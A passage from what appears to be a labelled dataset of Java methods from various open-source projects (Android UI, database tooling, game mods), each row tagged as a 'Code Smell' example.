  if (mCurrentMode == SearchableJTree.MODE_NORMAL && showAllClickableArea) {
    showAllClickableAreaView(graphics2D,mCodeLocatorWindow.getCurrentSelectView());
  }
}",1,Code Smell
"private Object process(Object obj) throws Throwable {
  if (obj instanceof Map) {
    Map paramMap=(Map)obj;
    for (    Object key : paramMap.keySet()) {
      if (paramMap.get(key) != null) {
        paramMap.put(key,process(paramMap.get(key)));
      }
    }
    return paramMap;
  }
  Map<String,Map<String,MybatisInterceptorConfig>> localInterceptorConfigMap=getConfig(obj);
  if (isEmpty(localInterceptorConfigMap)) {
    return obj;
  }
  Object newObject=obj.getClass().newInstance();
  BeanUtils.copyBean(newObject,obj);
  for (  String attrName : localInterceptorConfigMap.keySet()) {
    if (isEmpty(localInterceptorConfigMap.get(attrName))) {
      continue;
    }
    MybatisInterceptorConfig interceptorConfig=localInterceptorConfigMap.get(attrName).get(Methods.encrypt.name());
    if (interceptorConfig == null || StringUtils.isBlank(interceptorConfig.getInterceptorClass()) || StringUtils.isBlank(interceptorConfig.getInterceptorMethod())) {
      continue;
    }
    Object fieldValue=BeanUtils.getFieldValueByName(interceptorConfig.getAttrName(),newObject);
    if (fieldValue != null) {
      Class<?> processClazz=Class.forName(interceptorConfig.getInterceptorClass());
      Method method=processClazz.getMethod(interceptorConfig.getInterceptorMethod(),Object.class);
      Object processedValue=method.invoke(null,fieldValue);
      if (processedValue instanceof byte[]) {
        BeanUtils.setFieldValueByName(newObject,interceptorConfig.getAttrName(),processedValue,byte[].class);
      }
 else {
        BeanUtils.setFieldValueByName(newObject,interceptorConfig.getAttrName(),processedValue,fieldValue.getClass());
      }
    }
  }
  return newObject;
}
",1,Code Smell
"private boolean isSqlQuoteIdentifierRequiredFor(String name){
  if (forceSqlQuoteIdentifierUsage)   return true;
  for (int i=0; i < name.length(); i++) {
    if (casing == Casing.TO_UPPER && Character.isLowerCase(name.charAt(i)) || casing == Casing.TO_LOWER && Character.isUpperCase(name.charAt(i)) || name.charAt(i) == openSqlIdentifier || name.charAt(i) == closeSqlIdentifier || name.charAt(i) == DEFAULT_CATALOG_SEPARATOR) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"private void putToAllStories(long dialogId,TL_stories.PeerStories stories){
  TL_stories.PeerStories old=allStoriesMap.get(dialogId);
  if (old != null && old.stories != null && !old.stories.isEmpty() && stories != null && stories.stories != null && !stories.stories.isEmpty()) {
    for (int i=0; i < stories.stories.size(); ++i) {
      if (stories.stories.get(i) instanceof TL_stories.TL_storyItemSkipped) {
        int storyId=stories.stories.get(i).id;
        for (int j=0; j < old.stories.size(); ++j) {
          if (old.stories.get(j).id == storyId && old.stories.get(j) instanceof TL_stories.TL_storyItem) {
            stories.stories.set(i,old.stories.get(j));
            break;
          }
        }
      }
    }
  }
  allStoriesMap.put(dialogId,stories);
}",1,Code Smell
"public void extractData(Long datasourceId,Long taskId,JobExecutionContext context){
  CoreDatasource coreDatasource=datasourceMapper.selectById(datasourceId);
  if (coreDatasource == null) {
    LogUtil.error(""Can not find datasource: "" + datasourceId);
    return;
  }
  CoreDatasourceTask coreDatasourceTask=datasourceTaskServer.selectById(taskId);
  if (coreDatasourceTask == null) {
    return;
  }
  datasourceTaskServer.checkTaskIsStopped(coreDatasourceTask);
  if (StringUtils.isNotEmpty(coreDatasourceTask.getTaskStatus()) && (coreDatasourceTask.getTaskStatus().equalsIgnoreCase(TaskStatus.Stopped.name()) || coreDatasourceTask.getTaskStatus().equalsIgnoreCase(TaskStatus.Suspend.name()))) {
    LogUtil.info(""Skip synchronization task: {} ,due to task status is {}"",coreDatasourceTask.getId(),coreDatasourceTask.getTaskStatus());
    return;
  }
  if (datasourceTaskServer.existUnderExecutionTask(datasourceId,coreDatasourceTask.getId())) {
    LogUtil.info(""Skip synchronization task for datasource due to exist others, datasource ID : "" + datasourceId);
    return;
  }
  DatasourceServer.UpdateType updateType=DatasourceServer.UpdateType.valueOf(coreDatasourceTask.getUpdateType());
  if (context != null) {
    UpdateWrapper<CoreDatasource> updateWrapper=new UpdateWrapper<>();
    updateWrapper.eq(""id"",datasourceId);
    CoreDatasource record=new CoreDatasource();
    record.setQrtzInstance(context.getFireInstanceId());
    datasourceMapper.update(record,updateWrapper);
  }
  extractedData(taskId,coreDatasource,updateType,coreDatasourceTask.getSyncRate());
  try {
    datasourceTaskServer.updateTaskStatus(coreDatasourceTask);
    updateDsTaskStatus(datasourceId);
  }
 catch (  Exception ignore) {
    LogUtil.error(ignore);
  }
}
",1,Code Smell
"@Override public String buildModifyTaleSql(Table oldTable,Table newTable){
  StringBuilder script=new StringBuilder();
  script.append(""ALTER TABLE "");
  if (StringUtils.isNotBlank(oldTable.getDatabaseName())) {
    script.append(""`"").append(oldTable.getDatabaseName()).append(""`"").append(""."");
  }
  script.append(""`"").append(oldTable.getName()).append(""`"").append(""\n"");
  if (!StringUtils.equalsIgnoreCase(oldTable.getName(),newTable.getName())) {
    script.append(""\t"").append(""RENAME TO "").append(""`"").append(newTable.getName()).append(""`"").append("",\n"");
  }
  if (!StringUtils.equalsIgnoreCase(oldTable.getComment(),newTable.getComment())) {
    script.append(""\t"").append(""COMMENT="").append(""'"").append(newTable.getComment()).append(""'"").append("",\n"");
  }
  if (oldTable.getIncrementValue() != newTable.getIncrementValue()) {
    script.append(""\t"").append(""AUTO_INCREMENT="").append(newTable.getIncrementValue()).append("",\n"");
  }
  for (  TableColumn tableColumn : newTable.getColumnList()) {
    if (StringUtils.isNotBlank(tableColumn.getEditStatus()) && StringUtils.isNotBlank(tableColumn.getColumnType()) && StringUtils.isNotBlank(tableColumn.getName())) {
      MysqlColumnTypeEnum typeEnum=MysqlColumnTypeEnum.getByType(tableColumn.getColumnType());
      script.append(""\t"").append(typeEnum.buildModifyColumn(tableColumn)).append("",\n"");
    }
  }
  for (  TableIndex tableIndex : newTable.getIndexList()) {
    if (StringUtils.isNotBlank(tableIndex.getEditStatus()) && StringUtils.isNotBlank(tableIndex.getType())) {
      MysqlIndexTypeEnum mysqlIndexTypeEnum=MysqlIndexTypeEnum.getByType(tableIndex.getType());
      script.append(""\t"").append(mysqlIndexTypeEnum.buildModifyIndex(tableIndex)).append("",\n"");
    }
  }
  script.append(buildGenerateReorderColumnSql(oldTable,newTable));
  if (script.length() > 2) {
    script=new StringBuilder(script.substring(0,script.length() - 2));
    script.append("";"");
  }
  return script.toString();
}",1,Code Smell
"@Override protected void onCreate(@Nullable Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  if (Build.VERSION.SDK_INT >= 23 && Build.VERSION.SDK_INT < 29 && !isStorageAllowed(this))   requestStoragePermission();
 else   exit();
}",1,Code Smell
"@Override public void onSharedPreferenceChanged(final SharedPreferences prefs,final String key){
  if (Settings.PREF_USE_CONTACTS.equals(key) && prefs.getBoolean(key,false) && !PermissionsUtil.checkAllPermissionsGranted(getActivity(),Manifest.permission.READ_CONTACTS)) {
    get(requireContext()).requestPermissions(this,getActivity(),Manifest.permission.READ_CONTACTS);
  }
 else   if (Settings.PREF_KEY_USE_PERSONALIZED_DICTS.equals(key) && !prefs.getBoolean(key,true)) {
    new AlertDialog.Builder(requireContext()).setMessage(R.string.disable_personalized_dicts_message).setNegativeButton(android.R.string.cancel,(dialogInterface,i) -> ((TwoStatePreference)findPreference(key)).setChecked(true)).setPositiveButton(android.R.string.ok,null).setOnCancelListener(dialogInterface -> ((TwoStatePreference)findPreference(key)).setChecked(true)).show();
  }
 else   if (Settings.PREF_SHOW_SUGGESTIONS.equals(key) && !prefs.getBoolean(key,true)) {
    ((TwoStatePreference)findPreference(Settings.PREF_ALWAYS_SHOW_SUGGESTIONS)).setChecked(false);
  }
  refreshEnabledSettings();
}
",1,Code Smell
"public boolean probablyRingtone(){
  if (getDocument() != null && RingtoneDataStore.ringtoneSupportedMimeType.contains(getDocument().mime_type) && getDocument().size < MessagesController.getInstance(currentAccount).ringtoneSizeMax * 2) {
    for (int a=0; a < getDocument().attributes.size(); a++) {
      TLRPC.DocumentAttribute attribute=getDocument().attributes.get(a);
      if (attribute instanceof TLRPC.TL_documentAttributeAudio) {
        if (attribute.duration < 60) {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"private void openDialogsToSend(boolean animated){
  Bundle args=new Bundle();
  args.putBoolean(""onlySelect"",true);
  args.putBoolean(""canSelectTopics"",true);
  args.putInt(""dialogsType"",DialogsActivity.DIALOGS_TYPE_FORWARD);
  args.putBoolean(""allowSwitchAccount"",true);
  if (contactsToSend != null) {
    if (contactsToSend.size() != 1) {
      args.putString(""selectAlertString"",LocaleController.getString(""SendContactToText"",R.string.SendMessagesToText));
      args.putString(""selectAlertStringGroup"",LocaleController.getString(""SendContactToGroupText"",R.string.SendContactToGroupText));
    }
  }
 else {
    args.putString(""selectAlertString"",LocaleController.getString(""SendMessagesToText"",R.string.SendMessagesToText));
    args.putString(""selectAlertStringGroup"",LocaleController.getString(""SendMessagesToGroupText"",R.string.SendMessagesToGroupText));
  }
  DialogsActivity fragment=new DialogsActivity(args){
    @Override public boolean shouldShowNextButton(    DialogsActivity dialogsFragment,    ArrayList<Long> dids,    CharSequence message,    boolean param){
      if (exportingChatUri != null) {
        return false;
      }
      if (contactsToSend != null && contactsToSend.size() == 1 && !mainFragmentsStack.isEmpty()) {
        return true;
      }
      if (dids.size() <= 1) {
        return videoPath != null || photoPathsArray != null && photoPathsArray.size() > 0;
      }
      return false;
    }
  }
;
  fragment.setDelegate(this);
  boolean removeLast;
  if (AndroidUtilities.isTablet()) {
    removeLast=layersActionBarLayout.getFragmentStack().size() > 0 && layersActionBarLayout.getFragmentStack().get(layersActionBarLayout.getFragmentStack().size() - 1) instanceof DialogsActivity;
  }
 else {
    removeLast=actionBarLayout.getFragmentStack().size() > 1 && actionBarLayout.getFragmentStack().get(actionBarLayout.getFragmentStack().size() - 1) instanceof DialogsActivity;
  }
  getActionBarLayout().presentFragment(fragment,removeLast,!animated,true,false);
  if (SecretMediaViewer.hasInstance() && SecretMediaViewer.getInstance().isVisible()) {
    SecretMediaViewer.getInstance().closePhoto(false,false);
  }
 else   if (PhotoViewer.hasInstance() && PhotoViewer.getInstance().isVisible()) {
    PhotoViewer.getInstance().closePhoto(false,true);
  }
 else   if (ArticleViewer.hasInstance() && ArticleViewer.getInstance().isVisible()) {
    ArticleViewer.getInstance().close(false,true);
  }
  StoryRecorder.destroyInstance();
  if (GroupCallActivity.groupCallInstance != null) {
    GroupCallActivity.groupCallInstance.dismiss();
  }
  if (!animated) {
    drawerLayoutContainer.setAllowOpenDrawer(false,false);
    if (AndroidUtilities.isTablet()) {
      actionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
      rightActionBarLayout.rebuildFragments(INavigationLayout.REBUILD_FLAG_REBUILD_LAST);
    }
 else {
      drawerLayoutContainer.setAllowOpenDrawer(true,false);
    }
  }
}",1,Code Smell
"private Space indentTo(Space space,int column,Space.Location spaceLocation){
  Space s=space;
  String whitespace=s.getWhitespace();
  if (spaceLocation == Space.Location.COMPILATION_UNIT_PREFIX && !StringUtils.isNullOrEmpty(whitespace)) {
    s=s.withWhitespace("""");
  }
 else   if (s.getComments().isEmpty() && !s.getLastWhitespace().contains(""\n"")) {
    return s;
  }
  if (s.getComments().isEmpty()) {
    int indent=findIndent(s);
    if (indent != column) {
      int shift=column - indent;
      s=s.withWhitespace(indent(whitespace,shift));
    }
  }
 else {
    boolean hasFileLeadingComment=!space.getComments().isEmpty() && (spaceLocation == Space.Location.COMPILATION_UNIT_PREFIX || (spaceLocation == Space.Location.CLASS_DECLARATION_PREFIX && space.getComments().get(0).isMultiline()));
    int finalColumn=spaceLocation == Space.Location.BLOCK_END ? column + style.getIndentSize() : column;
    String lastIndent=space.getWhitespace().substring(space.getWhitespace().lastIndexOf('\n') + 1);
    int indent=getLengthOfWhitespace(StringUtils.indent(lastIndent));
    if (indent != finalColumn) {
      if (hasFileLeadingComment || whitespace.contains(""\n"") && !(!s.getComments().isEmpty() && s.getComments().get(0) instanceof TextComment && !s.getComments().get(0).isMultiline()&& getLengthOfWhitespace(s.getWhitespace()) == 0)) {
        int shift=finalColumn - indent;
        s=s.withWhitespace(whitespace.substring(0,whitespace.lastIndexOf('\n') + 1) + indent(lastIndent,shift));
      }
      Space finalSpace=s;
      int lastCommentPos=s.getComments().size() - 1;
      s=s.withComments(ListUtils.map(s.getComments(),(i,c) -> {
        if (c instanceof TextComment && !c.isMultiline()) {
          if ((i != lastCommentPos) && getLengthOfWhitespace(c.getSuffix()) == 0) {
            return c;
          }
        }
        String priorSuffix=i == 0 ? space.getWhitespace() : finalSpace.getComments().get(i - 1).getSuffix();
        int toColumn=spaceLocation == Space.Location.BLOCK_END && i != finalSpace.getComments().size() - 1 ? column + style.getIndentSize() : column;
        Comment c2=c;
        if (priorSuffix.contains(""\n"") || hasFileLeadingComment) {
          c2=indentComment(c,priorSuffix,toColumn);
        }
        if (c2.getSuffix().contains(""\n"")) {
          int suffixIndent=getLengthOfWhitespace(c2.getSuffix());
          int shift=toColumn - suffixIndent;
          c2=c2.withSuffix(indent(c2.getSuffix(),shift));
        }
        return c2;
      }
));
    }
  }
  return s;
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public static void onEntityMoved(LivingEntity living,Level worldIn,BlockPos pos,int level){
  if (living.onGround()) {
    BlockState blockstate=Blocks.FROSTED_ICE.defaultBlockState();
    int f=Math.min(16,2 + level);
    BlockPos.MutableBlockPos blockpos$mutable=new BlockPos.MutableBlockPos();
    for (    BlockPos blockpos : BlockPos.betweenClosed(pos.offset(-f,-1,-f),pos.offset(f,-1,f))) {
      if (blockpos.closerToCenterThan(living.position(),f)) {
        blockpos$mutable.set(blockpos.getX(),blockpos.getY() + 1,blockpos.getZ());
        BlockState blockstate1=worldIn.getBlockState(blockpos$mutable);
        if (blockstate1.isAir()) {
          BlockState blockstate2=worldIn.getBlockState(blockpos);
          if (blockstate2 == FrostedIceBlock.meltsInto() && blockstate.canSurvive(worldIn,blockpos) && worldIn.isUnobstructed(blockstate,blockpos,CollisionContext.empty()) && !((WorldBridge)worldIn).bridge$forge$onBlockPlace(blockpos,living,Direction.UP)) {
            if (CraftEventFactory.handleBlockFormEvent(worldIn,blockpos,blockstate,living)) {
              worldIn.scheduleTick(blockpos,Blocks.FROSTED_ICE,Mth.nextInt(living.getRandom(),60,120));
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override protected void onHiddenLinkClicked(){
  String text;
  if ((slug == null || slug.isEmpty()) && giftCode.to_id == NO_USER_ID) {
    text=LocaleController.getString(""BoostingOnlyGiveawayCreatorSeeLink"",R.string.BoostingOnlyGiveawayCreatorSeeLink);
  }
 else {
    text=LocaleController.getString(""BoostingOnlyRecipientCode"",R.string.BoostingOnlyRecipientCode);
  }
  BulletinFactory.of(container,resourcesProvider).createSimpleBulletin(R.raw.chats_infotip,text).show(true);
}
",1,Code Smell
"private FileAppenderFactory<RowData> createRowDataFileAppenderFactory(Table table,RowType flinkSchema,List<Integer> equalityFieldIds,boolean upsert,boolean appendMode){
  if (equalityFieldIds == null || equalityFieldIds.isEmpty() || appendMode) {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec);
  }
 else   if (upsert) {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec,ArrayUtil.toIntArray(equalityFieldIds),TypeUtil.select(schema,Sets.newHashSet(equalityFieldIds)),null);
  }
 else {
    return new FlinkAppenderFactory(schema,flinkSchema,table.properties(),spec,ArrayUtil.toIntArray(equalityFieldIds),schema,null);
  }
}
",1,Code Smell
"@Test public void testUserDisassociationForNotAuthRecipes() throws Exception {
  if (StorageLayer.getStorage(process.getProcess()).getType() != STORAGE_TYPE.SQL) {
    return;
  }
  createTenants();
  Reflections reflections=new Reflections(""io.supertokens.pluginInterface"");
  Set<Class<? extends NonAuthRecipeStorage>> classes=reflections.getSubTypesOf(NonAuthRecipeStorage.class);
  List<String> names=classes.stream().map(Class::getCanonicalName).collect(Collectors.toList());
  List<String> classNames=new ArrayList<>();
  for (  String name : names) {
    if (name.contains(""SQLStorage"")) {
      continue;
    }
    if (name.equals(UserMetadataStorage.class.getName()) || name.equals(JWTRecipeStorage.class.getName()) || name.equals(ActiveUsersStorage.class.getName())) {
      continue;
    }
    classNames.add(name);
  }
  TenantIdentifier t2=new TenantIdentifier(null,""a1"",""t2"");
  for (  String className : classNames) {
    String userId=""userId"";
    StorageLayer.getStorage(t2,process.main).addInfoToNonAuthRecipesBasedOnUserId(t2,className,userId);
    JsonObject response=TestMultitenancyAPIHelper.disassociateUserFromTenant(t2,userId,process.getProcess());
    assertEquals(""OK"",response.getAsJsonPrimitive(""status"").getAsString());
    assertTrue(response.get(""wasAssociated"").getAsBoolean());
  }
}",1,Code Smell
"@IsLogin public PageResponseModel<MessagePageResponse> page(PageRequestModel<MessagePageRequest> pageRequestModel){
  MessagePageRequest pageRequest=pageRequestModel.getFilter();
  Message message=Message.builder().channel(MessageChannelEn.STATION_LETTER).receiver(IdValue.builder().id(LoginUserContext.getUser().getId().toString()).build()).type(MessageTypeEn.getEntityByDesc(pageRequest.getTypeDesc())).build();
  PageResult<Message> pageResult=messageRepository.page(PageUtil.buildPageRequest(pageRequestModel,message));
  if (ObjectUtils.isEmpty(pageResult.getList())) {
    return PageResponseModel.build(pageResult.getTotal(),pageResult.getSize(),new ArrayList<>());
  }
  Set<Long> userIds=new HashSet<>();
  Set<Long> postsIds=new HashSet<>();
  SafesUtil.ofList(pageResult.getList()).forEach(message1 -> {
    userIds.add(Long.valueOf(message1.getSender().getId()));
    if (MessageTypeEn.APPROVAL_ARTICLE.equals(message.getType()) || MessageTypeEn.APPROVAL_FAQ.equals(message.getType()) || MessageTypeEn.COMMENT_FAQ.equals(message.getType())|| MessageTypeEn.COMMENT_ARTICLE.equals(message.getType())) {
      postsIds.add(Long.valueOf(message1.getTitle()));
    }
  }
);
  List<User> users=userRepository.queryByIds(new ArrayList<>(userIds));
  List<BasePosts> postsList=new ArrayList<>();
  if (!ObjectUtils.isEmpty(postsIds)) {
    postsList=postsRepository.queryInIds(postsIds);
  }
  List<MessagePageResponse> responses=MessageTransfer.toMessagePageResponses(pageResult.getList(),users,postsList,LoginUserContext.getUser());
  return PageResponseModel.build(pageResult.getTotal(),pageResult.getSize(),responses);
}",1,Code Smell
"@Override public boolean onScroll(@NonNull MotionEvent e1,@NonNull MotionEvent e2,float distanceX,float distanceY){
  float dx=e1.getX() - e2.getX();
  float dy=e1.getY() - e2.getY();
  if (Math.abs(dx) > AndroidUtilities.getPixelsInCM(0.4f,true) && Math.abs(dx) / 3 > dy && startDragging && !lockDragging) {
    startDragging=false;
    Runnable action=() -> {
      if (dx > 0) {
        if (realCurrentPage < 2) {
          setCurrentPage(realCurrentPage + 1,true);
        }
      }
 else {
        if (realCurrentPage > 0) {
          setCurrentPage(realCurrentPage - 1,true);
        }
      }
      lockDragging=false;
    }
;
    if (scrollAnimator != null) {
      lockDragging=true;
      AndroidUtilities.runOnUIThread(action,scrollAnimator.getDuration() - scrollAnimator.getCurrentPlayTime() + 50);
    }
 else {
      action.run();
    }
  }
  return super.onScroll(e1,e2,distanceX,distanceY);
}",1,Code Smell
"public static int process(char[] str,int index,HashSet<Integer> lights){
  if (index == str.length) {
    for (int i=0; i < str.length; i++) {
      if (str[i] != 'X') {
        if (!lights.contains(i - 1) && !lights.contains(i) && !lights.contains(i + 1)) {
          return Integer.MAX_VALUE;
        }
      }
    }
    return lights.size();
  }
 else {
    int no=process(str,index + 1,lights);
    int yes=Integer.MAX_VALUE;
    if (str[index] == '.') {
      lights.add(index);
      yes=process(str,index + 1,lights);
      lights.remove(index);
    }
    return Math.min(no,yes);
  }
}",1,Code Smell
"private static void assertValidTypes(TypeValidation typeValidation,J sf){
  if (typeValidation.identifiers() || typeValidation.methodInvocations() || typeValidation.methodDeclarations()|| typeValidation.classDeclarations()|| typeValidation.constructorInvocations()) {
    List<FindMissingTypes.MissingTypeResult> missingTypeResults=FindMissingTypes.findMissingTypes(sf);
    missingTypeResults=missingTypeResults.stream().filter(missingType -> {
      if (missingType.getJ() instanceof J.Identifier) {
        return typeValidation.identifiers();
      }
 else       if (missingType.getJ() instanceof J.ClassDeclaration) {
        return typeValidation.classDeclarations();
      }
 else       if (missingType.getJ() instanceof J.MethodInvocation || missingType.getJ() instanceof J.MemberReference) {
        return typeValidation.methodInvocations();
      }
 else       if (missingType.getJ() instanceof J.NewClass) {
        return typeValidation.constructorInvocations();
      }
 else       if (missingType.getJ() instanceof J.MethodDeclaration) {
        return typeValidation.methodDeclarations();
      }
 else       if (missingType.getJ() instanceof J.VariableDeclarations.NamedVariable) {
        return typeValidation.variableDeclarations();
      }
 else {
        return true;
      }
    }
).collect(Collectors.toList());
    if (!missingTypeResults.isEmpty()) {
      throw new IllegalStateException(""LST contains missing or invalid type information\n"" + missingTypeResults.stream().map(v -> v.getPath() + ""\n"" + v.getPrintedTree()).collect(Collectors.joining(""\n\n"")));
    }
  }
}
",1,Code Smell
"private boolean playChannel(int channelGroupIndex,int liveChannelIndex,boolean changeSource){
  if ((channelGroupIndex == currentChannelGroupIndex && liveChannelIndex == currentLiveChannelIndex && !changeSource) || (changeSource && currentLiveChannelItem.getSourceNum() == 1)) {
    showChannelInfo();
    return true;
  }
  mVideoView.release();
  if (!changeSource) {
    currentChannelGroupIndex=channelGroupIndex;
    currentLiveChannelIndex=liveChannelIndex;
    currentLiveChannelItem=getLiveChannels(currentChannelGroupIndex).get(currentLiveChannelIndex);
    Hawk.put(HawkConfig.LIVE_CHANNEL,currentLiveChannelItem.getChannelName());
    livePlayerManager.getLiveChannelPlayer(mVideoView,currentLiveChannelItem.getChannelName());
  }
  mVideoView.setUrl(currentLiveChannelItem.getUrl());
  showChannelInfo();
  mVideoView.start();
  return true;
}",1,Code Smell
"private void insertOrUpdate(T item,String statement) throws SQLException {
  String parsedStatement=parse(statement);
  try (PreparedStatement ps=connection.prepareStatement(parsedStatement)){
    setParams(ps,item);
    final int updated=ps.executeUpdate();
    if (updated != 1) {
      throw concurrentDatabaseModificationException(item,updated);
    }
  }
 catch (  SQLException e) {
    String lowerCaseMessage=e.getMessage().toLowerCase();
    if (e.getErrorCode() == -803 || lowerCaseMessage.contains(""duplicate"") || lowerCaseMessage.contains(""primary key"") || lowerCaseMessage.contains(""unique constraint"")) {
      throw concurrentDatabaseModificationException(item,0);
    }
    throw e;
  }
}",1,Code Smell
"@Override public String signature(@Nullable Object t){
  return signature((Type)t);
}
private String signature(@Nullable Type type){
  if (type == null || type instanceof Type.UnknownType || type instanceof NullType) {
    return ""{undefined}"";
  }
 else   if (type instanceof Type.IntersectionClassType) {
    return intersectionSignature(type);
  }
 else   if (type instanceof Type.ClassType) {
    try {
      return ((Type.ClassType)type).typarams_field != null && ((Type.ClassType)type).typarams_field.length() > 0 ? parameterizedSignature(type) : classSignature(type);
    }
 catch (    Symbol.CompletionFailure ignored) {
      return ((Type.ClassType)type).typarams_field != null && ((Type.ClassType)type).typarams_field.length() > 0 ? parameterizedSignature(type) : classSignature(type);
    }
  }
 else   if (type instanceof Type.CapturedType) {
    return signature(((Type.CapturedType)type).wildcard);
  }
 else   if (type instanceof Type.TypeVar) {
    return genericSignature(type);
  }
 else   if (type instanceof Type.JCPrimitiveType) {
    return primitiveSignature(type);
  }
 else   if (type instanceof Type.JCVoidType) {
    return ""void"";
  }
 else   if (type instanceof Type.ArrayType) {
    return arraySignature(type);
  }
 else   if (type instanceof Type.WildcardType) {
    Type.WildcardType wildcard=(Type.WildcardType)type;
    StringBuilder s=new StringBuilder(""Generic{"" + wildcard.kind.toString());
    if (!type.isUnbound()) {
      s.append(signature(wildcard.type));
    }
    return s.append(""}"").toString();
  }
 else   if (type instanceof Type.JCNoType) {
    return ""{none}"";
  }
 else   if (type instanceof Type.AnnotatedType) {
    return signature(type.unannotatedType());
  }
  throw new IllegalStateException(""Unexpected type "" + type.getClass().getName());
}",1,Code Smell
"@Override public boolean remove(int x,int y,int z){
  long tableAddr=this.tableAddr;
  if (tableAddr == 0L) {
    return false;
  }
  long mask=this.tableSize - 1L;
  long flag=positionFlag(x,y,z);
  int searchBucketX=x >> BUCKET_AXIS_BITS;
  int searchBucketY=y >> BUCKET_AXIS_BITS;
  int searchBucketZ=z >> BUCKET_AXIS_BITS;
  long hash=hashPosition(searchBucketX,searchBucketY,searchBucketZ);
  for (long i=0L; ; i++) {
    long bucketAddr=tableAddr + ((hash + i) & mask) * BUCKET_BYTES;
    int bucketX=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_X_OFFSET);
    int bucketY=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Y_OFFSET);
    int bucketZ=PUnsafe.getInt(bucketAddr + BUCKET_KEY_OFFSET + KEY_Z_OFFSET);
    long value=PUnsafe.getLong(bucketAddr + BUCKET_VALUE_OFFSET);
    if (value == 0L) {
      return false;
    }
 else     if (bucketX != searchBucketX || bucketY != searchBucketY || bucketZ != searchBucketZ) {
      continue;
    }
 else     if ((value & flag) == 0L) {
      return false;
    }
    this.size--;
    if ((value & ~flag) == 0L) {
      this.usedBuckets--;
      this.shiftBuckets(tableAddr,(hash + i) & mask,mask);
    }
 else {
      PUnsafe.putLong(bucketAddr + BUCKET_VALUE_OFFSET,value & ~flag);
    }
    return true;
  }
}
@Override public boolean remove(@NonNull int... point){
  checkArg(point.length == 3);
  return this.remove(point[0],point[1],point[2]);
}",1,Code Smell
"@Override public int pointToPosition(int x,int y){
  if (mColumnWidth + mHorizontalSpacing <= 0 || mRowHeight + mVerticalSpacing == 0) {
    return INVALID_POSITION;
  }
  int m=(x - mFirstLeft) / (mColumnWidth + mHorizontalSpacing);
  int n=(y - mFirstTop) / (mRowHeight + mVerticalSpacing);
  int right=mFirstLeft + (m + 1) * (mColumnWidth + mHorizontalSpacing);
  int bottom=mFirstTop + (n + 1) * (mRowHeight + mVerticalSpacing) + mRowHeight;
  if (x > right || y > bottom || m >= mColumnsNum) {
    return INVALID_POSITION;
  }
 else {
    int result=n * mColumnsNum + m + mFirstVisibleFirstItem;
    result=result <= getLastVisiblePosition() ? result : INVALID_POSITION;
    return result;
  }
}",1,Code Smell
"public void setSharedElementEnterTransition(Activity activity,String sharedElementName){
  setSharedElementEnterTransition(activity,sharedElementName,DEFAULT_TIMEOUT);
}
public void setSharedElementEnterTransition(Activity activity,String sharedElementName,long timeoutMs){
  if ((activity == null && !TextUtils.isEmpty(sharedElementName)) || (activity != null && TextUtils.isEmpty(sharedElementName))) {
    throw new IllegalArgumentException();
  }
  if (activity == mActivityToRunTransition && TextUtils.equals(sharedElementName,mSharedElementName)) {
    return;
  }
  mActivityToRunTransition=activity;
  mSharedElementName=sharedElementName;
  if (DEBUG) {
    Log.d(TAG,""postponeEnterTransition "" + mActivityToRunTransition);
  }
  Object transition=TransitionHelper.getSharedElementEnterTransition(activity.getWindow());
  setAutoStartSharedElementTransition(transition != null);
  ActivityCompat.postponeEnterTransition(mActivityToRunTransition);
  if (timeoutMs > 0) {
    new Handler().postDelayed(new TransitionTimeOutRunnable(this),timeoutMs);
  }
}",1,Code Smell
"private int scrollOffsetForQuote(MessageObject object){
  if (TextUtils.isEmpty(highlightMessageQuote) || object == null) {
    if (dummyMessageCell != null) {
      dummyMessageCell.computedGroupCaptionY=0;
      dummyMessageCell.computedCaptionLayout=null;
    }
    return 0;
  }
  int offsetY;
  CharSequence text;
  ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks;
  if (!TextUtils.isEmpty(object.caption) && dummyMessageCell != null && dummyMessageCell.captionLayout != null) {
    offsetY=(int)dummyMessageCell.captionY;
    text=object.caption;
    textLayoutBlocks=dummyMessageCell.captionLayout.textLayoutBlocks;
  }
 else {
    offsetY=0;
    text=object.messageText;
    textLayoutBlocks=object.textLayoutBlocks;
    if (dummyMessageCell != null && dummyMessageCell.linkPreviewAbove) {
      offsetY+=dummyMessageCell.linkPreviewHeight + dp(10);
    }
  }
  if (dummyMessageCell != null) {
    dummyMessageCell.computedGroupCaptionY=0;
    dummyMessageCell.computedCaptionLayout=null;
  }
  if (textLayoutBlocks == null || text == null) {
    return 0;
  }
  int index=MessageObject.findQuoteStart(text.toString(),highlightMessageQuote,highlightMessageQuoteOffset);
  if (index < 0) {
    return 0;
  }
  for (int i=0; i < textLayoutBlocks.size(); ++i) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(i);
    StaticLayout layout=block.textLayout;
    String layoutText=layout.getText().toString();
    if (index > block.charactersOffset) {
      final float y;
      if (index - block.charactersOffset > layoutText.length() - 1) {
        y=offsetY + (int)(block.textYOffset + block.padTop + block.height);
      }
 else {
        y=offsetY + block.textYOffset + block.padTop+ layout.getLineTop(layout.getLineForOffset(index - block.charactersOffset));
      }
      if (y > AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f)) {
        return (int)(y - AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f));
      }
      return 0;
    }
  }
  return 0;
}",1,Code Smell
"@Override public void onPropsSet(){
  super.onPropsSet();
  if (isTornDown()) {
    return;
  }
  final Node node=getNodeJni();
  if (mViroContext == null || mScene == null || mScene.getNativeScene() == null || node == null) {
    return;
  }
  if (mImage == null || !mImage.hasKey(""source"")) {
    onError(""Viro: Missing required Image for a Viro Particle Emitter!"");
    return;
  }
  downloadImageIfNeeded();
  if (mLatestTexture == null) {
    return;
  }
  setImageOnParticle();
  if (mNativeEmitter == null) {
    mNativeEmitter=new ParticleEmitter(mViroContext,mNativeQuad);
    node.setParticleEmitter(mNativeEmitter);
  }
  updateSpawnModifier();
